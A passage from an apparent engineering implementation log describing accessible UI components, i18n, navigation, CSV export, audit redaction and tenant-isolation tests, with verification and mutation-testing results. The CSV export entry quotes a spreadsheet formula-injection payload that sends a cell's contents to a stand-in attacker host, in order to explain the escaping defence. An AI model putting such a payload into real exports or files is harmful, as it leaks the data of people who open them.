| `messages.ts` | 5/5 killed, **after fixing two tests that passed for the wrong reason** |
| `apps/web/src/lib/i18n.ts` | 9 killed, **1 equivalent**; one vacuous test fixed |
| `logical-css.sh` | 5/5 killed, and the documented exemption honoured |

### Three tests that proved nothing, and one comment that was wrong
This is the part worth reading.

**`resolveLocale` — two tests passed for the wrong reason.** `resolveLocale('en-AU', ['fr', 'en'])` expected `'en'`, which is also the default fallback. Deleting the base-language branch entirely still returned `'en'`. The fix is to make the fallback a *different* language from the expected answer.

**The header length cap.** The flood was built from tags like `xx0`, `xx1` — which the shape check discards anyway, so removing the cap still produced `[]`. Rebuilt from well-formed tags, plus an assertion that the same tags *under* the cap are parsed, so the empty result is the cap and not the shape check quietly doing the work.

**My own comment in `parseMoney` was false.** It claimed `Math.round(1.005 * 100)` mis-parses to 100 minor units. That is true of the expression and irrelevant here: `1.005` has three decimals, so for EUR it is **rejected by the precision check before any multiplication**. I scanned every two-decimal value from 0.01 upward and magnitudes past `Number.MAX_SAFE_INTEGER` and found no accepted input where the two routes disagree. The mutant is recorded as **equivalent** rather than papered over with a contrived test, and the comment now says so. The string implementation stays because it is exact by construction rather than exact by empirical accident.

**A `?? {}` that could never be reached.** A missing catalogue would have rendered a page of raw message keys with no error anywhere — and the branch was unreachable, so it could not be tested either. Replaced with a load-time invariant that throws if the fallback locale has no catalogue, proven by renaming the catalogue key and watching the error appear. Same shape as the unreachable fail-closed branch found in `redaction.py` at STEP-002.07.

### A runtime check TypeScript could not give me
The first version of the "no ambient zone" test asserted that `formatDateTime` throws without a `timeZone`. **It did not throw.** `Intl.DateTimeFormat` treats `timeZone: undefined` as "use the system zone", so the failure was not an exception — it was a server silently rendering in whatever zone the container happened to have. TypeScript makes the argument required and that is worthless at the package boundary, where JavaScript consumers, `any` from a fetch, and optional fields two layers up all arrive as `undefined`. `assertZone` now rejects an absent zone **and** a misspelled one, because `Europe/Londn` must never quietly become the system default.

### The performance cost, stated rather than hidden
`headers()` in the root layout opts every route out of static rendering — the build output now marks all seven routes `ƒ (Dynamic)`. That is free today, because the only page is already `force-dynamic` for session cookies, and it stops being free when STEP-007 adds cacheable pages. The migration is a `/[locale]/` path segment, and it is written into `layout.tsx` rather than left to be rediscovered.

### RTL is enforced at the source, not tested at the surface
Physical properties (`left`, `margin-left`) and logical ones (`inset-inline-start`, `margin-inline-start`) render **identically** in the LTR locale everyone develops in. No unit test catches the difference; it appears only in a language nobody on the team reads. So `tests/guards/logical-css.sh` fails the build on any physical directional property, with a same-line `rtl-exempt: <reason>` escape hatch that is reviewable because it must state why.

### A pre-existing broken production build — BUG-017
`pnpm --filter @journeylab/web build` failed at `bb943f9`, before any change here. Confirmed by stashing the working tree and rebuilding at HEAD: identical failure. Next's own type-check step loads the TypeScript **compiler API**, which TypeScript 7 (ADR-009) does not ship, so Next decides TypeScript is missing, "installs" it, and then crashes with an error naming nothing that is actually wrong.

Nothing in `pnpm verify` or CI ran `next build`, which is why it sat undetected.

**My first fix was wrong, and the CI mirror is the only reason that is known.** `ignoreBuildErrors: true` made the build pass locally, so I committed it. `pnpm ci:local` failed on the next run: that flag does not gate the probe, it only decides whether the *result* is enforced. Locally the auto-install branch stumbled through; under `CI=true` the same probe aborts with the single word `Failed`. One defect, two symptoms, and only one visible where I was looking.

The real fix is `@typescript/native-preview` as a pinned **marker** devDependency — Next 16 has an explicit branch that skips its check when that package resolves. Nothing imports it, and `tsc` still resolves to 7.0.2 (native-preview's binary is `tsgo`). `ignoreBuildErrors` stays, for an unobvious reason: without it the build prints *"Running TypeScript … Finished TypeScript in 75ms"* having checked nothing, and a green message for work that did not happen is worse than an honest "Skipping validation of types".

`pnpm build` is now part of `verify`, which protects its own fix: remove the marker and `verify` fails.

### What is NOT met
**RTL implementation** — explicitly Phase 2, and out of scope by the sub-step's own boundary. What is delivered is the precondition: logical properties everywhere, enforced.

**Translation content** — also out of scope. One catalogue ships, and the machinery around it is the deliverable.

**Real-browser RTL rendering.** The RTL test asserts structure in jsdom, which does not lay anything out. Binds at STEP-003.08 with the other browser-dependent checks.

### Follow-ups
| Item | Owner step |
| --- | --- |
| `/[locale]/` routing to restore static rendering | STEP-007 |
| Real-browser RTL and touch-target verification | STEP-003.08 |
| Cross-package impact is invisible to the graph (`workspace:*` not followed) | STEP-026 |
| Trip-supplied time zone replacing the UTC default | STEP-009 |

---

## IMPL-020 — STEP-003.06 — Role-aware desktop and mobile navigation

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-SEC-004 |
| Blast radius | [BR-023](blast-radius/BR-023-navigation.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `94bf916` — matched HEAD at pre-change |

### What was built
`packages/ui/src/nav/` — `navigation.tsx` and a **generated** `authz-matrix.ts`; `tools/gen_authz_matrix_ts.py`; navigation wired into the shell header. 21 tests (220 in the package).

### ADR-012's review trigger fired, and its prediction held
That ADR said the frontend would eventually need the matrix in TypeScript, that it must be **generated from the same markdown**, and that the shared parser made a second emitter additive. All three were correct: `gen_authz_matrix_ts.py` reuses `parse_matrix()` unchanged and the Python emitter was not touched.

Two hand-maintained copies of an authorization matrix diverge, and the divergence is silent — the menu starts offering something the server refuses, or hiding something it permits, and neither is visible from either file alone.

### Why the security tests matter more than the rendering ones
The sub-step says it plainly: *"a hidden nav item with an open endpoint is a vulnerability, not a UI bug."* So the tests establish two separate things:

1. **Hiding matches the server** — every operation × every role, not a sample.
2. **Hiding is not relied upon, and cannot become a control by accident.** The function is `visibleItems`, not `permittedItems`. A test asserts it contains no `fetch`, `redirect` or `throw`, that the `href` survives filtering, and that the module says so in plain words.

The last of those looks like testing a comment, and is deliberate. The comment is the only thing standing between a future reader and the assumption that the menu protects the route.

### Other decisions
**`aria-current="page"`, and the CSS styles from that attribute** rather than a separate class. One source, so the visual state cannot say something different from what a screen reader announces.

**44×44 touch targets**, not the 24×24 that WCAG 2.2 AA requires. The difference between technically-compliant and usable with a thumb on a moving train — which is where a traveller uses this.

**Role hard-coded to `guest`** in the shell until the session provider lands. Guest sees the least, so the placeholder cannot accidentally reveal an item.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 220 UI |
| Live render | `<nav aria-label="Main navigation">`; guest sees no `/admin/` links; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** role filtering removed, `aria-current` dropped, drawer focus trap removed, `aria-expanded` hard-coded, and an unknown pairing shown instead of hidden.

### What is NOT met
**"Directly requesting a hidden route is denied server-side."** No routes exist — `/admin/*` and `/trips` are not pages, and no endpoint enforces anything until STEP-004. The policy itself is proven at STEP-002.03 across 176 cells, but that is a unit test of the decision function, not a request to a route. Recorded unmet rather than counted as covered by the policy tests.

### Surprises
**Biome's `useValidAriaRole` fired on a React prop named `role`.** It reads `role="guest"` on a component as the HTML ARIA attribute. That is a false positive — but the collision is real for human readers too, so the prop became `actorRole` rather than adding a suppression. Given I had just added two suppressions that suppressed nothing, biasing away from them was the right instinct.

**The blanket rename then caught a loop variable of the same name**, breaking two assertions. A regex rename is not a refactor; typecheck caught it immediately.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Server-denial test against real routes | STEP-004 |
| Touch-target and breakpoint verification in a browser | STEP-003.08 |
| Session provider to replace the hard-coded `guest` | STEP-004 |

---

## IMPL-019 — STEP-003.05 — Application frame, providers and global error boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-NFR-013 |
| Blast radius | [BR-022](blast-radius/BR-022-app-shell.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b09a0a2` — matched HEAD at pre-change |

### What was built
`packages/ui/src/shell/` (error boundaries, skip link, locale direction) and a real `apps/web` frame replacing the STEP-002.05 scaffold. 20 tests (199 in the package).

### Why this approach
**The unit of error containment is the FEATURE, not the app.** Blueprint §8.114 requires that a map or chart failure not remove itinerary text. A single root boundary satisfies the opposite: it turns one component's failure into a blank page. So `FeatureErrorBoundary` sits *between* siblings, and a test asserts that when the map throws, "Day 1: ferry to the island" and "Day 2: coastal walk" are both still on screen.

**The error message is never rendered.** An `Error.message` can carry a URL, a stack frame or a provider response. A test throws `ECONNREFUSED https://provider.internal/key=abc123` and asserts neither the host nor the key reaches the DOM; the detail goes to `onError` for reporting.

**Feature boundaries do not use `role="alert"`; the global one does.** Interrupting the user is wrong when the point of containment is that the rest of the page still works — and right when there is nothing left to interrupt.

**Provider order is documented because the sub-step flagged it.** Outermost-in: global boundary → locale → session → query/data. The rule that falls out is worth stating plainly: **nothing that fetches sits above the session.** A client cache keyed without a session can serve one tenant's data to another — the client-side form of the hazard `REQ-SEC-002` names for server caches.

**`lang` and `dir` are derived together.** A mismatched pair (`lang="ar"` with `dir="ltr"`) is worse than either alone, and that mismatch is exactly what a hand-maintained setting drifts into.

**The skip link is first in the document and its target carries `tabIndex={-1}`.** Browsers differ on whether `href="#id"` moves focus or only scrolls; without the target being programmatically focusable, the link scrolls and leaves focus where it was — looking like it worked.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 199 UI |
| Live render against the dev server | Three landmarks; **skip link first focusable in body**; `lang="en" dir="ltr"`; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** boundary re-throwing instead of containing, error message rendered to the user, feature boundary using `role="alert"`, recovery performed automatically, and direction hard-coded to LTR.

### What is NOT met
**CWV budgets.** `FRONTEND_ARCHITECTURE` §7 sets LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1. None is measurable in jsdom — they need a real browser and Lighthouse, which arrive at STEP-003.08. The shell is small and static and *likely* passes; likely is not measured, so the criterion is recorded unmet.

### Two architectural problems this surfaced
**`.ts`/`.tsx` import specifiers made the package unusable.** They require every *consumer* to enable `allowImportingTsExtensions`; `apps/web` does not, and Next's bundler rejects them outright. Every relative import in `packages/ui` is now extensionless.

**Seven modules needed `'use client'`.** Anything using hooks or class lifecycle cannot render on the server. Neither problem was visible while `packages/ui` was only consumed by its own tests — they appeared the moment a real application imported it.

### Surprises
**A dead suppression comment again.** Biome reported a `biome-ignore` in `providers.tsx` for a rule that never fires — the second in two sub-steps. That is a pattern in my own work, not bad luck: I am adding them pre-emptively rather than in response to a rule that actually fires, and each one teaches the next reader that a constraint exists where it does not.

**The same JSX syntax error twice.** Placing a comment beside the root element of a `return` is invalid, and I did it in `.04` and again here. Rationale belongs in the doc comment.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Measure CWV against §7 budgets | STEP-003.08 |
| Locale, session and query providers | STEP-003.07, STEP-004 |
| Error reporting sink for `onError` | STEP-024 |
| Skip-link visibility on focus in a real browser | STEP-003.08 |

---

## IMPL-018 — STEP-003.04 — Table, list and CSV export

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-002 (also REQ-A11Y-003) |
| Blast radius | [BR-021](blast-radius/BR-021-table-list-csv.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `c358d4b` — matched HEAD at pre-change |

### What was built
`packages/ui/src/data/` — `table.tsx` (DataTable, DataList) and `csv.ts`. 27 tests (179 in the package).

### Why this approach
**Virtualisation must not lie about size.** Rendering 20 of 10,000 rows is how a table stays fast, and it is also how a screen reader comes to announce "row 3 of 20" — telling the user the dataset is 500 times smaller than it is, with no way to discover otherwise. `aria-rowcount` on the table and `aria-rowindex` on each row carry the true totals independently of the DOM, so a virtualised row 4,001 announces itself as 4,001. Both are computed from the full set; the window is a rendering concern only.

**No virtualisation library was adopted.** The sub-step warns that they "frequently break AT row counts", so `virtualWindow` is a plain prop: the caller picks the slice, the component keeps the ARIA contract correct regardless. Any library adopted later must pass these tests, which now exist first.

**CSV export is a security surface, not a formatting convenience.** A cell starting `=`, `+`, `-`, `@`, tab or CR is executed as a formula by Excel, LibreOffice and Sheets. A trip note reading `=HYPERLINK("https://evil.example/?d="&A1,"Click me")` exfiltrates the adjacent cell when a colleague opens the shared file. The attacker never touches our servers — they type into a field we faithfully export.

Our data makes this worse than average: briefs and comments are free text, and exports are meant to be shared. Dangerous cells are prefixed with `'`, which spreadsheets render as literal text — the value survives, the execution does not.

**Export uses the full sorted set, never the rendered window.** Exporting what happens to be on screen hands the user a silently truncated file. Asserted with a 500-row dataset and a 10-row window.

**`aria-sort` on the sorted column only.** Setting `"none"` on every other header is noise a screen reader announces on each cell.

**The list keeps every header attached to its value** via a definition list. A responsive table that drops headers on small screens conveys strictly less than the wide one, which `REQ-A11Y-002` does not permit.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 179 UI |
| axe, WCAG 2.2 AA | Zero violations: table, list, empty table, virtualised table |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** `aria-rowcount` reporting the window, `aria-rowindex` restarting per window, the formula-injection defence removed, export truncated to the window, `scope` dropped from headers, and `aria-sort="none"` on every column.

### Surprises
**A suppression comment that suppressed nothing.** Biome reported that my `biome-ignore` in `dialog.tsx` had no effect — the rule never fired there. Removed rather than left in place: a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there.

**Biome preferred `<section>` to `role="region"`**, and was right — a native element carries the role implicitly and cannot lose it to a typo. Fixing it, I put a JSX comment before the root element of a `return` and broke the parse; the rationale moved to the doc comment where it belongs.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Real windowing (measurement, scroll sync) | STEP-011, first large dataset |
| Arrow-key grid navigation, if a dataset needs it | Deferred — a native table is already navigable by screen-reader table commands |
| Verify any virtualisation library against these row-count tests | Before adopting one |

---

## IMPL-017 — STEP-003.03 — Feedback primitives: dialog, notification, empty, error, skeleton

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-A11Y-004 (also REQ-EVID-005, REQ-CONS-005, REQ-NFR-003) |
| Blast radius | [BR-020](blast-radius/BR-020-feedback-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b28bf15` — matched HEAD at pre-change |

### What was built
`packages/ui/src/feedback/` — 45 tests (152 in the package).

| File | Role |
| --- | --- |
| `states.ts` | The nine mandatory states as data, with icon, label and politeness |
| `dialog.tsx` | Focus trap, restoration, Escape |
| `panels.tsx` | One component per state, plus `Progress` |
| `notification.tsx` | Toast with required politeness; always-mounted regions |

### Why this approach
**The nine states are data, so "all nine" is checkable.** FRONTEND_ARCHITECTURE §4 mandates a specific list and the acceptance criterion says all nine must exist. A list in a comment cannot be verified; a test compares the declared set against the required one.

**Three requirements are enforced by making the wrong thing unconstructible**, rather than discouraged in a style guide nobody re-reads:

- `Progress` requires both a `label` and an `onCancel`. `REQ-NFR-003` forbids a silent spinner — so a bare spinner cannot be built.
- `InfeasibleState` **throws** on an empty conflict set. `REQ-CONS-005` requires a minimal conflict set, never a bare failure; an empty panel would be the uninformative dead end the requirement exists to prevent.
- `StaleDataState` requires `subject` and `observedAt`. `REQ-EVID-005` wants staleness at the point of use, so this component cannot be rendered as a page-level "some data may be out of date" — there is no way to construct it without naming the thing and the time.

**Assertive politeness is rationed.** Only `infeasible`, `unauthorized` and `offline` interrupt. Interrupting someone mid-sentence is justified only when what they are reading is wrong; everything else waits for a pause. A test pins that exact set, so widening it is a deliberate act.

**`UnauthorizedState` offers no retry and names nothing.** Retrying cannot grant permission, and offering it implies it might. More importantly, STEP-002.02 made denial and absence indistinguishable at the API — a panel saying "you lack permission for trip 4821" would undo that at the last hop. A test asserts the text leaks none of *forbidden*, *permission*, *not found*, *exists*, *tenant*.

**Notifications never auto-dismiss.** WCAG 2.2.1 requires time limits to be adjustable; a toast that vanishes on a timer is unreadable to anyone using a screen reader, magnification, or simply reading slowly. Both live regions are mounted before any message exists, because a region created when content arrives is frequently never announced.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 152 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all ten primitives plus the dialog |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** focus never restored, focus trap removed, Escape disabled, infeasible accepting an empty conflict set, a quality state dropped, and progress losing its cancel control.

### The bug worth recording
**The focus trap was silently inert.** My visibility filter used `element.offsetParent !== null`. jsdom computes no layout, so that is *always* null — the filter returned an empty list and the trap did nothing. Three tests failed immediately.

It would also have been wrong in a real browser: `offsetParent` is null for `position: fixed` elements, which is what a dialog usually is. So the jsdom failure exposed a genuine defect rather than an environment quirk. Replaced with checks on `hidden`, `aria-hidden` and `inert`, none of which need layout.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Validate streamed-update politeness with a real screen reader | STEP-003.08 / STEP-011 |
| Icon set behind the `data-icon` names | STEP-003.04 / .05 |
| Feature error boundaries (map/chart failure must not remove itinerary text) | STEP-013 |

---

## IMPL-016 — STEP-003.02 — Form and input primitives with validation states

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001 |
| Blast radius | [BR-019](blast-radius/BR-019-form-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `0e3ea40` — matched HEAD at pre-change |

### What was built
`packages/ui/src/form/` — the repository's first components. 39 new tests (107 in the package).

| File | Role |
| --- | --- |
| `field.tsx` | Label, description and error association; the polite live region |
| `inputs.tsx` | TextInput, NumberInput, DateInput, Select, Checkbox, RadioGroup |
| `locale-number.ts` | Separator-aware parsing that refuses ambiguity |
| `zoned-date.ts` | Calendar dates and explicit-zone conversion |

### Why this approach
**Association is centralised so it cannot be forgotten.** Getting label, description and error wiring right once is easy; getting it right on the fourteenth form is not. Every primitive routes through `Field`, so a component author cannot ship an input whose error is invisible to a screen reader.

**Errors are polite, and focus never moves.** `aria-live="polite"`, not `role="alert"` — assertive interrupts the user mid-sentence, which for someone still typing means being cut off about a field they have not finished. And the region is rendered *always*, not inserted when an error appears: a live region created at the moment it gains content is frequently never announced, because the screen reader must already be observing the node.

**`Number.parseFloat` is wrong for user input.** `parseFloat("1.234,56")` returns **1.234** — off by three orders of magnitude, silently. Separators come from `Intl.NumberFormat` per locale, and genuinely ambiguous input like `"1,23"` is **refused** rather than guessed, because guessing is wrong half the time.

**`type="text"` with `inputMode="decimal"`, not `type="number"`.** A native number input silently discards characters the browser dislikes, so a German user typing `1.234,56` can lose part of what they typed with no feedback.

**Dates carry no implicit zone.** `DateInput` hands back a `CalendarDate`, never a `Date`. A `Date` is an instant and a date input's value is not one; attaching the browser's zone is exactly the bug the sub-step warns "becomes an infeasible itinerary in STEP-012". `startOfDayUtc` requires an IANA zone with no default, and probes the offset rather than assuming it, so DST boundaries do not drift an hour.

**Disabled and read-only are kept distinct.** `disabled` removes the control from the tab order, excludes it from submission, and in several screen readers makes it unreadable — the user cannot discover what the field was. `readOnly` keeps it focusable and readable. "You cannot change this right now, but here is its value" is almost always read-only.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 107 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all six primitives |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** live region made assertive, `aria-describedby` dropping the error, label disassociated, read-only implemented as disabled, and `NumberInput` reverted to `type="number"`.

### Biome caught two standards errors I had written
`aria-required` on `input[type=date]` — that input type has **no ARIA role**, so the attribute is unsupported on it. Moving it to a `<fieldset>` for the radio group was no better: a fieldset maps to `role="group"`, which does not support `aria-required` either, and forcing `role="radiogroup"` onto a non-interactive element trades one violation for another.

The correct answer in both cases was to stop reaching for ARIA. The native `required` attribute already maps to the same accessibility property, and per the HTML spec `required` on one radio makes its whole same-named group required. **Reaching for ARIA when HTML already says it is how elements end up over-annotated and less accessible, not more.**

### Surprises
**A mutant appeared to survive, and my harness had mutated a comment.** Flipping `aria-live="polite"` to `assertive` failed nothing — because the first textual occurrence of that string in `field.tsx` is inside the module docstring, not the JSX. Re-run against the actual attribute, two tests failed as they should.

Third time a mutation harness has misled me: once through a `ruff format` reflow, once through an apostrophe terminating a quoted block, now through a docstring. **A mutation that reports "survived" needs its own verification that it applied to code.**

**axe passing first time was itself suspicious**, so before trusting it I proved it fails on an unlabelled input and an image with no alt. Those two proofs are now permanent tests — without them, "zero violations" is indistinguishable from axe not running.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Resolve ICU message loading vs server components | Before STEP-003.07 |
| Real-browser verification (jsdom is not a browser) | STEP-003.08 |
| Assistive-technology testing beyond axe | STEP-003.08 |

---

## IMPL-015 — STEP-003.01 — Design tokens including high-contrast and reduced-motion

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-004, REQ-NFR-013 |
| Blast radius | [BR-018](blast-radius/BR-018-design-tokens.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `9f5ff36` — matched HEAD at pre-change |

### What was built
`packages/ui/` — the first design-system package. 68 tests.

| File | Role |
| --- | --- |
| `src/tokens.ts` | Source of truth: three palettes, scales, motion, status tokens |
| `src/tokens.css` | **Generated** custom properties with media queries |
| `src/contrast.ts` | WCAG 2.2 relative-luminance and contrast-ratio maths |
| `tools/gen-tokens.ts` | Generator; drift-gated by a test |

### Why this approach
**Accessibility claims are computed, not asserted.** "These colours pass AA" is something someone checked once, in a tool, against values that have since been edited. Every declared foreground/background pairing has its ratio computed from the token values on every test run, so a colour edited below the bar breaks the build.

The contrast maths is itself verified against published values first — black on white is 21:1, `#767676` on white is 4.54:1. If that function were wrong, every other assertion would be meaningless.

**A colour on its own has no contrast**, so foregrounds are declared *alongside* the backgrounds they may appear on. A test then fails on any colour token with no declared pairing, because such a token is unverifiable.

**Non-text UI is held to 3:1, not 4.5:1** — WCAG 2.2 SC 1.4.11. Borders and focus rings would otherwise be over-constrained into ugliness for no accessibility gain.

**High contrast is a distinct palette held to AAA**, not dark mode intensified. A test asserts it differs from the dark palette, because the lazy implementation is to alias them.

**Reduced motion suppresses rather than shortens.** The sub-step called this vestibular safety, not a preference. Every duration is exactly `0ms` and the test asserts `toBe("0ms")` rather than "shorter than default" — a 60ms animation still moves, and movement is what triggers vertigo. A `!important` catch-all also neutralises any component that hard-codes its own duration.

**Both `prefers-contrast` and `forced-colors`.** Windows High Contrast Mode signals only the latter; handling just `prefers-contrast` would strand exactly the users who most need it.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 68 UI |
| Typecheck | Both packages, own configs |
| Module boundaries | 25 files |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** secondary text lightened below AA, a status losing its icon, reduced motion shortened to 60ms instead of suppressed, `forced-colors` support dropped, and a font size hard-coded in px.

### The bug worth recording
**The drift test was self-repairing.** `tokens.css` is generated, and the test imports the generator to compare its output against the committed file. But the generator wrote the file at module top level — so importing it *rewrote the very file the test was about to check*. It could never have failed.

Visible only as a stray `wrote src/tokens.css` line in the test output. The write is now guarded behind a direct-invocation check, and a hand-edited `tokens.css` was confirmed to break the suite.

**A test that repairs the thing it verifies proves nothing.** Same family as `BUG-001`'s self-truncating guard and the mutation harness that mutated nothing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Lint rule forbidding hard-coded values components should take from tokens | STEP-003.02 |
| Real-browser `forced-colors` verification | STEP-003.08 |
| Confirm the chart library honours token theming | Before STEP-013 |

---

## IMPL-014 — STEP-002.07 — Audit event emission and runtime flag primitives

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-007, REQ-PLAT-012 |
| Blast radius | [BR-017](blast-radius/BR-017-audit-and-flags.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d7d71cf` — matched HEAD at pre-change |

### What was built
Migration 002 (`audit_events`, `feature_flags`) and `services/audit/` — `audit.py`, `redaction.py`, `flags.py`. 29 tests; 335 Python tests total.

This closes the gaps carried since `.03` and `.04`: `provisioning` has been returning `AuditRecord` and `authz` returning `Decision.audit` with nothing to receive them. `impact(AuditRecord)` confirmed it — two consumers, **both tests**.

### Why this approach
**Append-only is a privilege, not a convention.** The sub-step asks that "no update or delete path exists in code". Code can be changed; a privilege cannot be talked around. `journeylab_app` holds INSERT and SELECT on `audit_events` and nothing else, so `UPDATE`, `DELETE` and `TRUNCATE` all return `permission denied` — verified against the live database, not asserted.

**Redaction at emission, never at query time.** Redacting on read means the raw value was already durably stored and every backup, replica and psql session has it. Redacting at emission means it was never written.

**Redaction failure blocks the write.** There is no `force=True`. This matters more here than anywhere else: the store is append-only, so a leaked secret could not be deleted afterwards.

**`conservative` is a required argument on every flag, with no default.** A default would be a guess about which direction is safe, and it differs per flag — `new_solver_ui` is conservatively `False`, `require_consent` is conservatively `True`. The sub-step named the trap: "a flag service outage that enables a half-built feature is a far worse outcome than one that disables a finished one." A flag whose author has not decided which way is safe cannot be evaluated.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 TypeScript |
| Shell R7 | **12/12** |
| Isolation suite | 14 passed, 5 pending |
| Guard meta-suite | **36/36** |
| Migration 002 idempotent | Re-applied with 0 errors |
| Append-only | `UPDATE`/`DELETE`/`TRUNCATE` → `permission denied` |

**Mutation testing — 4/4 killed:** flags failing open on an outage, the redaction sweep removed, an audit write failure swallowed, and a malformed flag value coerced generously.

### Two real defects, found by tests rather than review
**`PRIMARY KEY (key, organization_id)` made the design impossible.** Primary key columns are implicitly `NOT NULL`, so the NULL-means-global row could never be inserted — the flag tests failed with a not-null violation. Replaced with a surrogate key plus two **partial** unique indexes, which also fixes a subtler problem: `(key, NULL)` is not unique under SQL NULL semantics, so two global rows for one key could have coexisted and made evaluation non-deterministic.

**A tuple containing a private key passed through `redact()` completely untouched.** `_redact_value` understands dict, list and str; a tuple fell through unchanged, and the safety sweep did not traverse tuples either. **The fail-closed branch was unreachable — decorative rather than protective.** The sweep now checks the string form of any type it does not understand, and a test proves it.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Wire emitters into request paths | STEP-004 |
| Audit volume and write-failure monitoring | STEP-024 |
| Admin console for flag changes | STEP-021 |
| Retention policy (needs `DEC-007`) | STEP-027 |

---

## IMPL-013 — STEP-002.06 — Cross-tenant isolation test suite

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-002 |
| Blast radius | [BR-016](blast-radius/BR-016-tenant-isolation-suite.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `2687bbe` — matched HEAD at pre-change |

### What was built
`tests/security/test_tenant_isolation.py` — 19 tests: 14 active, 5 pending. R7 now runs in pytest (the fast tier) as well as the shell suite from STEP-002.01.

| Vector | Coverage |
| --- | --- |
| Storage | Cross-tenant read, write and unbound listing all denied |
| Authorization | **Every operation × every role** against a foreign resource — 198 combinations, not sampled |
| Enumeration | Denial body carries no tenant, role or permission wording |
| Jobs | Payload round-trip; missing context raises; no ambient store to inherit |
| Events | Conflicting tenant refused; acting tenant stamped |
| Cache, outbox, export, vector store, graph | **Pending — see below** |

### Why this approach
**The pending vectors are the interesting part.** Five paths named by `REQ-SEC-002` have nothing to test: there is no cache, no outbox, no export, no vector store, no domain graph. The two easy options are both bad — omit them and they are forgotten, or write a test that passes vacuously, which is worse because it manufactures confidence.

Each unbuilt vector instead has a test that **detects whether its subsystem has landed**:

- not landed → `skip`, with the reason stated
- landed → **`fail`**, naming the subsystem and demanding a real test

A placeholder that cannot notice its own dependency arriving is just a comment. These convert themselves into failures.

**Two suites, deliberately overlapping at storage.** The shell suite proves the database in isolation and runs without Python; this one proves the path application code actually takes. Losing either loses a distinct guarantee.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 311 Python + 41 TypeScript |
| Shell R7 (STEP-002.01) | **12/12** |
| Guard meta-suite | **36/36** |
| mypy strict / ruff | Clean on 19 files |

**Pending-vector mechanism proven, not assumed.** Seeded a fake `cache.py` in `apps/api/src/` → the cache vector failed with *"The 'cache' subsystem now exists, but its cross-tenant isolation test is still a placeholder."* Created an `outbox` table → the outbox vector failed the same way. Removing both returned all five to skips.

**Mutation testing — 3/3 killed:** the tenant check removed from `authorize` (3 tests), the cross-tenant denial no longer marked `audit=True` (1 test), and a job payload defaulting instead of raising (1 test).

### The meta-test is the point
The suite disables the `memberships` RLS policy on purpose, asserts the storage vector then **leaks**, and restores it. Without that, every other assertion in the file could pass with row-level security switched off entirely — which is exactly the failure `BUG-007` produced at STEP-002.01, where a security suite reported passes while the schema was absent.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Cache isolation | STEP-010 |
| Outbox refusing unstamped/foreign envelopes | STEP-006 |
| Export isolation | STEP-015 / STEP-022 |
| Vector-store tenant scoping | STEP-010 |
| Graph traversal permission (`REQ-KG-006`) | STEP-026 |
| Persisting audit records for denials | STEP-002.07 |

---

## IMPL-012 — STEP-002.05 — Browser session, token refresh and guest sessions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (**partial** — see below), REQ-PRIV-001 |
| Blast radius | [BR-014](blast-radius/BR-014-browser-session.md) (**HIGH**) |
| Decisions closed | **`DEC-004` → Auth0** (`ADR-013`); guest lifetime 7 days (`ADR-014`) |
| Commit | see git log for this entry |
| Graph indexed commit | `c58be3b` — matched HEAD at pre-change |

### What was built
